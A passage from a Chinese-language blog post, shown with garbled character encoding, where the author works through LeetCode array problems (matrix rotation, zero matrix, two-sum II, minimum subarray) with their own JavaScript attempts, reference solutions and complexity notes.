end]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode2015â€”â€”æ—‹è½¬çŸ©é˜µï¼ˆâ˜†â˜†ï¼‰ï¼ˆåŒ48æ—‹è½¬å›¾åƒï¼‰"><a href="#LeetCode2015â€”â€”æ—‹è½¬çŸ©é˜µï¼ˆâ˜†â˜†ï¼‰ï¼ˆåŒ48æ—‹è½¬å›¾åƒï¼‰" class="headerlink" title="LeetCode2015â€”â€”æ—‹è½¬çŸ©é˜µï¼ˆâ˜†â˜†ï¼‰ï¼ˆåŒ48æ—‹è½¬å›¾åƒï¼‰"></a>LeetCode2015â€”â€”æ—‹è½¬çŸ©é˜µï¼ˆâ˜†â˜†ï¼‰ï¼ˆåŒ48æ—‹è½¬å›¾åƒï¼‰</h2><p>è·³è½¬åœ°å€</p><h3 id="è‡ªå·±çš„ä»£ç -2"><a href="#è‡ªå·±çš„ä»£ç -2" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rotate = <span class="function"><span class="keyword">function</span> (<span class="params">matrix</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> arr=[]</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; matrix.length; i++)&#123;</span><br><span class="line">    arr[i] = <span class="keyword">new</span> <span class="built_in">Array</span>()</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; matrix.length; j++)&#123;</span><br><span class="line">      arr[i][j] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; matrix.length; i++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; matrix.length; j++)&#123;</span><br><span class="line">      arr[j][matrix.length-<span class="number">1</span>-i] = matrix[i][j]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><del>æ„Ÿè§‰æ²¡æ¯›ç—…å•Šï¼Ÿåœ¨vscodeé‡Œèƒ½è·‘å‡ºæ¥ï¼Œå¯ä¸ºå•¥åœ¨lcé‡Œç¬¬ä¸€ä¸ªéƒ½è¿‡ä¸äº†å‘¢ï¼Ÿ</del> </p><p>é¢˜ç›®è¯´äº†ï¼Œä¸å ç”¨é¢å¤–çš„å†…å­˜ç©ºé—´ï¼æ‰€ä»¥éœ€è¦<strong>æŠŠæ–°çš„æ•°ç»„å¤åˆ¶åˆ°åŸæ•°ç»„</strong>ã€‚ï¼ˆç„¶åå°±è¿‡äº†ã€‚ã€‚ï¼‰</p><h3 id="æ€è·¯1-amp-é¢˜è§£-1"><a href="#æ€è·¯1-amp-é¢˜è§£-1" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rotate = <span class="function"><span class="keyword">function</span>(<span class="params">matrix</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> n = matrix.length;</span><br><span class="line">    <span class="keyword">const</span> matrix_new = <span class="keyword">new</span> <span class="built_in">Array</span>(n).fill(<span class="number">0</span>).map(<span class="function">() =&gt;</span> <span class="keyword">new</span> <span class="built_in">Array</span>(n).fill(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            matrix_new[j][n - i - <span class="number">1</span>] = matrix[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            matrix[i][j] = matrix_new[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>jsåˆå§‹åŒ–äºŒç»´æ•°ç»„ï¼šï¼ˆå¤ªå·§å¦™äº†ï¼Œä¸åƒæˆ‘é‚£æ ·åŒé‡forå¾ªç¯ï¼‰</p><p><code>new Array(n).fill(0).map(() =&gt; new Array(n).fill(0))</code> </p></li><li><p>æŠŠmatrix.lengthçš„å€¼ææ—©èµ‹å€¼ç»™nï¼Œå› ä¸ºåé¢éœ€è¦ç”¨åˆ°å¤šæ¬¡ã€‚æé«˜æ•ˆç‡</p></li></ul><h3 id="å¤æ‚åº¦åˆ†æ-2"><a href="#å¤æ‚åº¦åˆ†æ-2" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><ul><li><p>æ—¶é—´å¤æ‚åº¦ï¼šO(N^2)ï¼Œå…¶ä¸­ N æ˜¯ matrix çš„è¾¹é•¿ã€‚</p></li><li><p>ç©ºé—´å¤æ‚åº¦ï¼šO(N^2)ã€‚æˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¸€ä¸ªå’Œ matrix å¤§å°ç›¸åŒçš„è¾…åŠ©æ•°ç»„ã€‚</p></li></ul><h3 id="æ€è·¯2-amp-é¢˜è§£-1"><a href="#æ€è·¯2-amp-é¢˜è§£-1" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>ç”¨ç¿»è½¬æ“ä½œä»£æ›¿æ—‹è½¬æ“ä½œï¼ˆæ—‹è½¬å¥½éš¾ï¼Œçœ‹ä¸æ‡‚å°±å…ˆä¸å†™äº†ï¼‰</p><p>ä¸ºäº†ç›´è§‚æ˜¾ç¤ºï¼Œå°±ç›´æ¥æ”¾lcé¢˜è§£ä¸­çš„å›¾ç‰‡äº†ã€‚</p><p><img src="https://i.loli.net/2021/06/13/rod8EOIMj42X3ya.jpg" alt="Snipaste_2021-06-13_11-26-28.jpg"></p><p><img src="https://i.loli.net/2021/06/13/VArObSCjZcaifH7.jpg" alt="Snipaste_2021-06-13_11-27-24.jpg"></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rotate = <span class="function"><span class="keyword">function</span>(<span class="params">matrix</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> n = matrix.length;</span><br><span class="line">    <span class="comment">// æ°´å¹³ç¿»è½¬</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">Math</span>.floor(n / <span class="number">2</span>); i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            [matrix[i][j], matrix[n - i - <span class="number">1</span>][j]] = [matrix[n - i - <span class="number">1</span>][j], matrix[i][j]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ä¸»å¯¹è§’çº¿ç¿»è½¬</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            [matrix[i][j], matrix[j][i]] = [matrix[j][i], matrix[i][j]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>äº¤æ¢æ•°ç»„å€¼æ—¶ï¼Œç”¨åˆ°äº†ES6ä¸­çš„<strong>è§£æ„èµ‹å€¼</strong>ã€‚ï¼ˆç­‰å·çš„å·¦å³ä¸¤è¾¹æ¨¡å¼ç›¸åŒï¼Œå°±ä¼šå°†å³è¾¹çš„å€¼èµ‹ç»™å·¦è¾¹çš„å˜é‡ï¼‰</p><h3 id="å¤æ‚åº¦åˆ†æ-3"><a href="#å¤æ‚åº¦åˆ†æ-3" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><ul><li>æ—¶é—´å¤æ‚åº¦ï¼šO(N^2)ï¼Œå…¶ä¸­ N æ˜¯ matrix çš„è¾¹é•¿ã€‚å¯¹äºæ¯ä¸€æ¬¡ç¿»è½¬æ“ä½œï¼Œæˆ‘ä»¬éƒ½éœ€è¦æšä¸¾çŸ©é˜µä¸­ä¸€åŠçš„å…ƒç´ ã€‚</li><li>ç©ºé—´å¤æ‚åº¦ï¼šO(1)ã€‚ä¸ºåŸåœ°ç¿»è½¬å¾—åˆ°çš„åŸåœ°æ—‹è½¬ã€‚</li></ul><h3 id="æ€è·¯3-amp-é¢˜è§£-1"><a href="#æ€è·¯3-amp-é¢˜è§£-1" class="headerlink" title="æ€è·¯3&amp;é¢˜è§£"></a>æ€è·¯3&amp;é¢˜è§£</h3><p>å€’å™å€’ç½®æ³•ï¼šå…ˆå°†çŸ©é˜µè½¬ç½®ï¼Œç„¶åå°†æ¯ä¸€è¡Œrowå€’åºï¼ˆreserveï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> rotate = <span class="function">(<span class="params">matrix</span>) =&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> n=matrix.length</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = i+<span class="number">1</span>; j &lt; n; j++)&#123;</span><br><span class="line">            [matrix[i][j],matrix[j][i]] = [matrix[j][i],matrix[i][j]]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    matrix.forEach(<span class="function"><span class="params">row</span>=&gt;</span> row.reverse())</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode2016â€”â€”é›¶çŸ©é˜µï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode2016â€”â€”é›¶çŸ©é˜µï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode2016â€”â€”é›¶çŸ©é˜µï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode2016â€”â€”é›¶çŸ©é˜µï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/zero-matrix-lcci/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -3"><a href="#è‡ªå·±çš„ä»£ç -3" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> n = matrix.length</span><br><span class="line">  <span class="keyword">var</span> arr = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(matrix))  </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j =<span class="number">0</span>; j &lt; matrix[i].length; j++)&#123;</span><br><span class="line">      <span class="keyword">if</span> (matrix[i][j] === <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> a = <span class="number">0</span>; a &lt; matrix[i].length; a++)&#123;</span><br><span class="line">          arr[i][a]=<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> b = <span class="number">0</span>; b &lt; n; b++)&#123;</span><br><span class="line">          arr[b][j]=<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><p>å¼€è¾Ÿäº†é¢å¤–çš„å†…å­˜ç©ºé—´ï¼Œæœ€åéœ€è¦å†èµ‹å€¼å›åŸæ•°ç»„ã€‚çœ‹é¢˜è§£æœ‰ä¸å¼€è¾Ÿçš„è§£æ³•ï¼Œç­‰ä»¥åå†çœ‹çœ‹å§ã€‚</p><h2 id="LeetCode498â€”â€”å¯¹è§’çº¿éå†ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode498â€”â€”å¯¹è§’çº¿éå†ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode498â€”â€”å¯¹è§’çº¿éå†ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode498â€”â€”å¯¹è§’çº¿éå†ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/diagonal-traverse/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -4"><a href="#è‡ªå·±çš„ä»£ç -4" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>æ˜¯çœŸä¸ä¼š= =æ„Ÿè§‰åº”è¯¥åˆ†ä¸¤ç§æƒ…å†µï¼ˆä¸€ä¸ªå¾€å³ä¸Šï¼Œä¸€ä¸ªå¾€å·¦ä¸‹ï¼‰ï¼Œå…ˆæ‰¾åˆ°å‡ æ¡å¯¹è§’çº¿ï¼ˆ2n-1ï¼‰ï¼Œç„¶åç›¸è¿ï¼Ÿä½†æ˜¯æ¯ç§æƒ…å†µäº¤ç•Œï¼ˆå‘å³å‘ä¸‹+1ï¼‰ä¹Ÿä¸ä¸€æ ·ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-1"><a href="#æ€è·¯-amp-é¢˜è§£-1" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><ol><li>åªæœ‰ä¸¤ç§ç§»åŠ¨æ–¹å‘ï¼š<br>å³ä¸Šç§»åŠ¨ <code>i-=1; j+=1</code><br>å·¦ä¸‹ç§»åŠ¨ <code>i+=1; j-=1</code></li><li>å¤„ç†ä¸Šä¸‹å·¦å³ç¼–è¾‘é—®é¢˜</li><li>è¶Šç•Œå³è½¬å¼¯</li></ol><p><a href="https://leetcode-cn.com/problems/diagonal-traverse/solution/dui-jiao-xian-bian-li-chao-jian-dan-while-jie-fa-b/">ä»£ç å¥½é•¿</a>ï¼Œè¶…è¿‡50è¡ŒçœŸçš„å°±ä¸æƒ³çœ‹äº†aa.</p><h2 id="LeetCode561â€”â€”æ•°ç»„æ‹†åˆ†-Iï¼ˆâ˜†ï¼‰"><a href="#LeetCode561â€”â€”æ•°ç»„æ‹†åˆ†-Iï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode561â€”â€”æ•°ç»„æ‹†åˆ† Iï¼ˆâ˜†ï¼‰"></a>LeetCode561â€”â€”æ•°ç»„æ‹†åˆ† Iï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/array-partition-i/">è·³è½¬åœ°å€</a>)</p><h3 id="è‡ªå·±çš„ä»£ç -5"><a href="#è‡ªå·±çš„ä»£ç -5" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>å¥½åƒéœ€è¦å®ç°å…¨æ’åˆ—ï¼Ÿä½†å…¶å®æœ€å¤§æ€»å’Œä¸€å®šæ˜¯ä¸¤ä¸ªæœ€å°ä¸€ç»„ï¼Œä¸¤ä¸ªæ¬¡å°ä¸€ç»„ã€‚ã€‚ä¸€ç›´åˆ°ä¸¤ä¸ªæœ€å¤§ä¸€ç»„ï¼Œä½†æ˜¯è¿™æ€ä¹ˆç”¨ä»£ç å®ç°å‘¢ï¼Ÿæ„Ÿè§‰è¿™ä¸è¯¥æ˜¯ä¸€é“easyï¼Œæ˜¯æˆ‘å¤ªèœäº†=</p><h3 id="æ€è·¯-amp-é¢˜è§£-2"><a href="#æ€è·¯-amp-é¢˜è§£-2" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>æ’åºï¼š<img src="https://i.loli.net/2021/06/16/mbS8nil2HVIaUox.jpg" alt="Snipaste_2021-06-16_21-56-57.jpg"></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arrayPairSum = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    nums.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b);</span><br><span class="line">    <span class="keyword">let</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">        ans += nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¥½å§ï¼Œå®åœ¨æ˜¯å¤ªå·§å¦™äº†ã€‚æƒ³åˆ°æ’åºä½†æ˜¯æ²¡æƒ³åˆ°ç´¯åŠ å¶æ•°é¡¹å°±å¯ä»¥äº†ã€‚ã€‚</p><h3 id="å¤æ‚åº¦åˆ†æ-4"><a href="#å¤æ‚åº¦åˆ†æ-4" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><ul><li><p>æ—¶é—´å¤æ‚åº¦ï¼šO(nlogn)ï¼Œå³ä¸ºå¯¹æ•°ç»„ nums è¿›è¡Œæ’åºçš„æ—¶é—´å¤æ‚åº¦ã€‚</p></li><li><p>ç©ºé—´å¤æ‚åº¦ï¼šO(logn)ï¼Œå³ä¸ºæ’åºéœ€è¦ä½¿ç”¨çš„æ ˆç©ºé—´ã€‚</p></li></ul><h2 id="LeetCode167â€”â€”ä¸¤æ•°ä¹‹å’Œ-II-è¾“å…¥æœ‰åºæ•°ç»„ï¼ˆâ˜†ï¼‰"><a href="#LeetCode167â€”â€”ä¸¤æ•°ä¹‹å’Œ-II-è¾“å…¥æœ‰åºæ•°ç»„ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode167â€”â€”ä¸¤æ•°ä¹‹å’Œ II - è¾“å…¥æœ‰åºæ•°ç»„ï¼ˆâ˜†ï¼‰"></a>LeetCode167â€”â€”ä¸¤æ•°ä¹‹å’Œ II - è¾“å…¥æœ‰åºæ•°ç»„ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/two-sum-ii-input-array-is-sorted/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -6"><a href="#è‡ªå·±çš„ä»£ç -6" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> twoSum = <span class="function"><span class="keyword">function</span>(<span class="params">numbers, target</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> arr = []</span><br><span class="line">  <span class="keyword">var</span> n,a</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; numbers.length; i++)&#123;</span><br><span class="line">    n = target - numbers[i];</span><br><span class="line">    a=numbers.indexOf(n)</span><br><span class="line">    <span class="keyword">if</span> (a!=-<span class="number">1</span>) &#123;</span><br><span class="line">      arr.push(i+<span class="number">1</span>);</span><br><span class="line">      arr.push(a + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ç”¨äº†indexOf æœç„¶é”™äº†ã€‚çœ‹åˆ°é¢˜è§£ä¸Šæœ‰äººè¯´â€œå°è±¡æ·±åˆ»ï¼Œç°åœ¨è¿˜è®°å¾—ï¼Œç¬¬ä¸€çœ‹å¥½ç®€å•ï¼Œé©¬ä¸Šå°±ç”¨ indexOf å†™äº†ï¼Œç„¶åè‚¯å®šæ²¡é€šè¿‡ï¼Œæ³ªç›®ã€‚ç°åœ¨çœ‹ï¼Œé‚£æ—¶å€™ä¸ä»…æ²¡æ³¨æ„å¤æ‚åº¦çš„é—®é¢˜ï¼Œè€Œä¸”é€»è¾‘ä¸Šä¹Ÿæœ‰äº›é—®é¢˜ï¼Œæ²¡æœ‰è€ƒè™‘ target ç”± numbers æœ‰ä¸¤ä¸ªç›¸åŒæ˜¯æ•°ç»„æˆçš„æƒ…å†µã€‚â€</p><p>å®³ï¼Œæ¶¨æ¶¨ç»éªŒæŠŠã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-2"><a href="#æ€è·¯1-amp-é¢˜è§£-2" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><ul><li>å£°æ˜ä¸€ä¸ªæ•°ç»„ a è®°å½•æ¯ä¸ª numbers ä¸­çš„å…ƒç´ ä¸ target ç›´æ¥çš„å·®å€¼ã€‚</li><li>å¦‚æœï¼šx+y=targetï¼Œé‚£ä¹ˆ target-x=yï¼Œtarget-y=x</li><li>å½“éå†åˆ°æ»¡è¶³è¦æ±‚çš„å€¼ç›´æ¥è¿”å›ï¼Œä¸ç„¶å­˜è´®å¯¹åº”çš„å·®å€¼åˆ° a çš„å¯¹åº”ç´¢å¼•ä½ç½®</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> twoSum = <span class="function"><span class="keyword">function</span> (<span class="params">numbers, target</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = []</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = numbers.length; i &lt; len; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> tmp = target - numbers[i]</span><br><span class="line">    <span class="keyword">if</span> (a[tmp] !== <span class="literal">undefined</span>) <span class="keyword">return</span> [a[tmp] + <span class="number">1</span>, i + <span class="number">1</span>]</span><br><span class="line">    a[numbers[i]] = i</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•å¥½å·§å¦™å•Š=</p><h3 id="æ€è·¯2-amp-é¢˜è§£-2"><a href="#æ€è·¯2-amp-é¢˜è§£-2" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>å¼ºè¡Œéå†ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> twoSum = <span class="function">(<span class="params">nums, target</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; nums.length; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] + nums[j] === target) &#123;</span><br><span class="line">                <span class="keyword">return</span> [i + <span class="number">1</span>, j + <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯3-amp-é¢˜è§£-2"><a href="#æ€è·¯3-amp-é¢˜è§£-2" class="headerlink" title="æ€è·¯3&amp;é¢˜è§£"></a>æ€è·¯3&amp;é¢˜è§£</h3><p>åŒæŒ‡é’ˆï¼š</p><ol><li>å®šä¹‰leftã€right</li><li>éå†è¿‡ç¨‹è‹¥nums[left] + nums[right] &gt; targetï¼Œå¤ªå¤§äº†ï¼Œè¦å°ä¸€ç‚¹ï¼Œåˆ™rightå·¦ç§»ä¸€ä½</li><li>éå†è¿‡ç¨‹è‹¥nums[left] + nums[right] &lt; targetï¼Œå¤ªå°äº†ï¼Œè¦å¤§ä¸€ç‚¹ï¼Œåˆ™leftå³ç§»ä¸€ä½</li><li>å…¶ä½™çš„æƒ…å†µå°±æ˜¯nums[left] + nums[right] == targetï¼Œreturn [left + 1, right + 1]å³å¯</li><li>æ³¨æ„é¢˜ç›®çš„indexä»1å¼€å§‹ï¼Œæ‰€ä»¥returnæ—¶+1å³å¯</li></ol><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> twoSum = <span class="function">(<span class="params">nums, target</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> left = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> right = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[left] + nums[right] &gt; target) &#123;</span><br><span class="line">            right--;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[left] + nums[right] &lt; target) &#123;</span><br><span class="line">            left++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> [left + <span class="number">1</span>, right + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode209â€”â€”é•¿åº¦æœ€å°çš„å­æ•°ç»„ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode209â€”â€”é•¿åº¦æœ€å°çš„å­æ•°ç»„ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode209â€”â€”é•¿åº¦æœ€å°çš„å­æ•°ç»„ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode209â€”â€”é•¿åº¦æœ€å°çš„å­æ•°ç»„ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/minimum-size-subarray-sum/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -7"><a href="#è‡ªå·±çš„ä»£ç -7" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p><del>æ²¡æœ‰å¤´ç»ª= æƒ³çš„æ˜¯å¯ä»¥å®šä¹‰ä¸€ä¸ªsumæ±‚å’Œå‡½æ•°ï¼Œç„¶åå¯¹numsæ•°ç»„ä¸€ä½ã€ä¸¤ä½è¿›è¡Œéå†ï¼Œä½†è¿™æ ·å¾ˆéº»çƒ¦è¿˜å®ç°ä¸äº†ã€‚</del></p><p>å¦‚æœæ‰¾åˆ°ä¸€ä¸ªå­æ•°ç»„ï¼Œå¦‚ä½•ç»§ç»­éå†æ‰¾ä¸‹ä¸€ä¸ªå­æ•°ç»„å‘¢ï¼Ÿï¼ˆä»ç¬¬nums[i]å¼€å§‹ï¼Ÿï¼‰</p><p>æ²¡æƒ³åˆ°æ€è·¯å†™ç€å†™ç€å°±åšå‡ºæ¥äº†ï¼Œè™½ç„¶ç”¨æ—¶å«åº•5%ã€‚ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> minSubArrayLen = <span class="function"><span class="keyword">function</span>(<span class="params">target, nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> minCount=<span class="number">10000</span></span><br><span class="line">  <span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (nums.reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b) &lt; target) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">    <span class="keyword">var</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i; j &lt; nums.length; j++)&#123;</span><br><span class="line">      sum += nums[j];</span><br><span class="line">      <span class="keyword">if</span> (sum &gt;= target) &#123;</span><br><span class="line">        count = j - i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (minCount &gt; count) &#123;</span><br><span class="line">          minCount = count;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> minCount</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯-amp-é¢˜è§£-3"><a href="#æ€è·¯-amp-é¢˜è§£-3" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>åŒæŒ‡é’ˆ+æ»‘åŠ¨çª—å£ï¼š</p><p><img src="https://i.loli.net/2021/06/17/RNI5kP2Cxwp9BJa.jpg" alt="Snipaste_2021-06-17_14-48-02.jpg"></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> minSubArrayLen = <span class="function"><span class="keyword">function</span>(<span class="params">s, nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> int_max = <span class="built_in">Number</span>.MAX_SAFE_INTEGER</span><br><span class="line">    <span class="keyword">var</span> i = <span class="number">0</span>, sum = <span class="number">0</span>, ans = int_max</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; nums.length; j++) &#123;</span><br><span class="line">        sum += 